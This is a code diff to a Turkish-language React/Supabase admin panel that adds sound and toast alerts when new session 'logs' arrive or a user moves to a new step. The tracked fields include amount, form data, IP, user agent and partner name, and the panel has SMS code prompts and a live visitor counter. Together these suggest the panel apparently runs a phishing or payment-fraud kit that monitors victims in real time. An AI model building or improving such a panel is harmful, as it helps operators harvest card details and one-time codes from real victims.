@@ -4,6 +4,7 @@ import { useCallback, useEffect, useState, useRef } from "react";
 import { createBrowserSupabaseClient } from "@/lib/supabase/client";
 import type { DemoSession } from "@/types/session";
 import { pathToStep } from "@/lib/session-routes";
+import { playBeautifulNotification, showBeautifulToast } from "@/lib/notification";
 
 const SESSION_LIST_COLUMNS =
   "id,created_at,amount,current_step,status,form_data,ip_address,user_agent,partner_name,is_hidden";
@@ -46,6 +47,31 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
   const [smsPromptSessionId, setSmsPromptSessionId] = useState<string | null>(null);
   const [smsDigitsInput, setSmsDigitsInput] = useState("6");
   const [smsCustomTextInput, setSmsCustomTextInput] = useState("");
+
+  const [soundEnabled, setSoundEnabled] = useState(false);
+  const soundEnabledRef = useRef(false);
+
+  useEffect(() => {
+    const savedSound = localStorage.getItem('admin1SoundEnabled');
+    if (savedSound === 'true') {
+      setSoundEnabled(true);
+      soundEnabledRef.current = true;
+    }
+  }, []);
+
+  useEffect(() => {
+    soundEnabledRef.current = soundEnabled;
+    localStorage.setItem('admin1SoundEnabled', soundEnabled.toString());
+  }, [soundEnabled]);
+
+  const playNotificationSound = useCallback((title: string = "Bildirim", desc?: string) => {
+    try {
+      playBeautifulNotification();
+      showBeautifulToast(title, desc);
+    } catch (e) {
+      console.error("Audio error:", e);
+    }
+  }, []);
 
   const load = useCallback(async () => {
     if (!supabase) return;
@@ -94,6 +120,19 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
 
           if (onlyPresenceChanged) {
             return;
+          }
+        }
+
+        if (soundEnabledRef.current) {
+          if (payload.eventType === "INSERT") {
+            playNotificationSound("Yeni Log Girişi", "Sisteme yeni bir kullanıcı katıldı.");
+          } else if (payload.eventType === "UPDATE") {
+            const newRow = payload.new as DemoSession;
+            const oldRow = rowsRef.current.find(r => r.id === newRow.id);
+
+            if (oldRow && oldRow.current_step !== newRow.current_step) {
+              playNotificationSound("Sayfa Değişti", `Kullanıcı yeni sayfaya geçti: ${newRow.current_step}`);
+            }
           }
         }
 
@@ -378,6 +417,23 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
 
   return (
     <div className="space-y-6">
+      <div className="flex items-center justify-between">
+        <h2 className={`text-lg font-bold ${darkMode ? 'text-white' : 'text-gray-900'}`}>Loglar ve Canlı Takip</h2>
+        <button 
+          onClick={() => {
+            setSoundEnabled(!soundEnabled);
+            if (!soundEnabled) playNotificationSound("Bildirim Testi", "Sesli bildirimler başarıyla açıldı.");
+          }}
+          className={`flex items-center gap-2 rounded-full px-4 py-2 border text-[11px] font-bold tracking-wide uppercase transition-colors ${
+            soundEnabled 
+              ? "bg-[#EB5E28]/10 border-[#EB5E28]/20 text-[#EB5E28]" 
+              : (darkMode ? "bg-zinc-800 border-zinc-700 text-zinc-500 hover:bg-zinc-700" : "bg-gray-100 border-gray-200 text-gray-500 hover:bg-gray-200")
+          }`}
+        >
+          {soundEnabled ? "🔊 Ses Açık" : "🔇 Ses Kapalı"}
+        </button>
+      </div>
+
       {/* STAT CARDS */}
       <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
         <StatCard icon="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z" color="text-yellow-500" title="Anlık Ziyaretçi" value={liveVisitorCount} darkMode={darkMode} />
